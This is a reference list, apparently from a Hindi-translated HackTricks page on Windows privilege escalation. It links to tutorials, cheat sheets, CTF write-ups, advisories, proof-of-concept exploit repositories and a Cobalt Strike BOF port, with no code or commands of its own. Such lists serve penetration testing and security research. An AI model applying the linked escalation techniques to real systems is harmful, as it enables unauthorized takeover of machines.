- [1] [Windows Privilege Escalation के मूल सिद्धांत](http://www.fuzzysecurity.com/tutorials/16.html)
- [2] [कमज़ोर folder permissions का फायदा उठाकर privileges बढ़ाना](http://www.greyhathacker.net/?p=738)
- [3] [Windows Privilege Escalation - एक cheatsheet](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [4] [lpeworkshop - Windows / Linux Local Privilege Escalation Workshop](https://github.com/sagishahar/lpeworkshop)
- [5] [DerbyCon 3.0 - Windows Attacks: AT is the new black (Rob Fuller & Chris Gates)](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [6] [Privilege Escalation - Windows - Total OSCP Guide](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [7] [Windows - Privilege Escalation - PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [8] [Windows Privilege Escalation Guide](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [9] [Windows-Privilege-Escalation checklist](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [10] [Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [11] [Pentesters के लिए Windows Privilege Escalation के तरीके](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [12] [0xdf – HTB/VulnLab JobTwo: SMTP के ज़रिए Word VBA macro phishing → hMailServer credential decryption → SYSTEM तक पहुँचने के लिए Veeam CVE-2023-27532](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [13] [HTB Reaper: Format-string leak + stack BOF → VirtualAlloc ROP (RCE) और kernel token चोरी](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)
- [14] [Check Point Research – Silver Fox का पीछा: Kernel Shadows में Cat & Mouse](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)
- [15] [Unit 42 – SCADA System में मौजूद privileged file system vulnerability](https://unit42.paloaltonetworks.com/iconics-suite-cve-2025-0921/)
- [16] [Symbolic Link Testing Tools – CreateSymlink का उपयोग](https://github.com/googleprojectzero/symboliclink-testing-tools/blob/main/CreateSymlink/CreateSymlink_readme.txt)
- [17] [अतीत से एक Link। Windows में Symbolic Links का दुरुपयोग](https://infocon.org/cons/SyScan/SyScan%202015%20Singapore/SyScan%202015%20Singapore%20presentations/SyScan15%20James%20Forshaw%20-%20A%20Link%20to%20the%20Past.pdf)
- [18] [RIP RegPwn – MDSec](https://www.mdsec.co.uk/2026/03/rip-regpwn/)
- [19] [RegPwn BOF (Cobalt Strike BOF port)](https://github.com/Flangvik/RegPwnBOF)
- [20] [ZDI - Node.js Trust Falls: Windows पर खतरनाक Module Resolution](https://www.thezdi.com/blog/2026/4/8/nodejs-trust-falls-dangerous-module-resolution-on-windows)
- [21] [Node.js modules: `node_modules` folders से लोड करना](https://nodejs.org/api/modules.html#loading-from-node_modules-folders)
- [22] [npm package.json: `optionalDependencies`](https://docs.npmjs.com/cli/v11/configuring-npm/package-json#optionaldependencies)
- [23] [Process Monitor (Procmon)](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon)
- [24] [Trail of Bits - C/C++ checklist की चुनौतियाँ, हल सहित](https://blog.trailofbits.com/2026/05/05/c/c-checklist-challenges-solved/)
- [25] [Microsoft Learn - RtlQueryRegistryValues function](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-rtlqueryregistryvalues)
- [26] [PowerShell Gallery - NtObjectManager](https://www.powershellgallery.com/packages/NtObjectManager/2.0.1)
- [27] [sec-zone - CVE-2026-36213](https://github.com/sec-zone/CVE-2026-36213)
- [28] [sec-zone - Hijack-service-binaries](https://github.com/sec-zone/Hijack-service-binaries)
- [29] [Microslop के साथ Pwn2Own: Windows LPE के लिए CLDFLT और DirectX Kernel Race Conditions को chain करना](https://dungnm.hashnode.dev/pwn2own-with-microslop)
- [30] [सब पर राज करने वाला एक I/O Ring: Windows 11 पर पूर्ण Read/Write Exploit Primitive](https://windows-internals.com/one-i-o-ring-to-rule-them-all-a-full-read-write-exploit-primitive-on-windows-11/)
- [31] [Privilege बढ़ाने और अन्य कमाल की तरकीबों के लिए मनमाने File Deletes का दुरुपयोग](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks)
- [32] [thezdi/PoC - FilesystemEoPs exploit code](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs)
- [33] [GoSecure – WSUS Attacks Part 2: CVE-2020-1013, Windows 10 Local Privilege Escalation 1-Day](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/)
- [34] [Windows 7: Credential Manager और Windows Vault की पड़ताल](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)
- [35] [jas502n - CVE-2019-1388 PoC](https://github.com/jas502n/CVE-2019-1388)
- [36] [research.nccgroup.com - Kerberos Resource Based Constrained Delegation: जब Image में बदलाव से Privilege Escalation होता है](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation)
- [37] [blog.ropnop.com - Windows 10 Ssh Agent से Ssh Private Keys निकालना](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent)
- [38] [SpecterOps – Enterprise Update Servers को Backdoor Factories में बदलना (0_o) – Part 1](https://specterops.io/blog/2026/08/05/turning-enterprise-update-servers-into-backdoor-factories-part-1/)
- [39] [SpecterOps – Enterprise Update Servers को Backdoor Factories में बदलना (0_o) – Part 2](https://specterops.io/blog/2026/08/05/turning-enterprise-update-servers-into-backdoor-factories-part-2/)
- [40] [bagelByt3s – NotWSUSPicious](https://github.com/bagelByt3s/NotWSUSPicious)
- [41] [Exodus Intelligence - Microsoft Windows Installer Folder Delete Privilege Escalation](https://blog.exodusintel.com/2026/07/06/microsoft-windows-installer-folder-delete-privilege-escalation/)
- [42] [Microsoft Security Response Center - CVE-2025-27727](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-27727)
- [43] [MDSec - Total Recall: अपने कदमों को वापस NT AUTHORITY\SYSTEM तक खोजना](https://www.mdsec.co.uk/2026/02/total-recall-retracing-your-steps-back-to-nt-authoritysystem/)
- [44] [NCC Group - Windows MIDI Services shared-memory offsets privilege escalation advisory](https://nccgroup.com/research/technical-advisory-microsoft-windows-midi-service-module-escalation-of-privileges-cve-2026-62688)
{{#include ../../banners/hacktricks-training.md}}
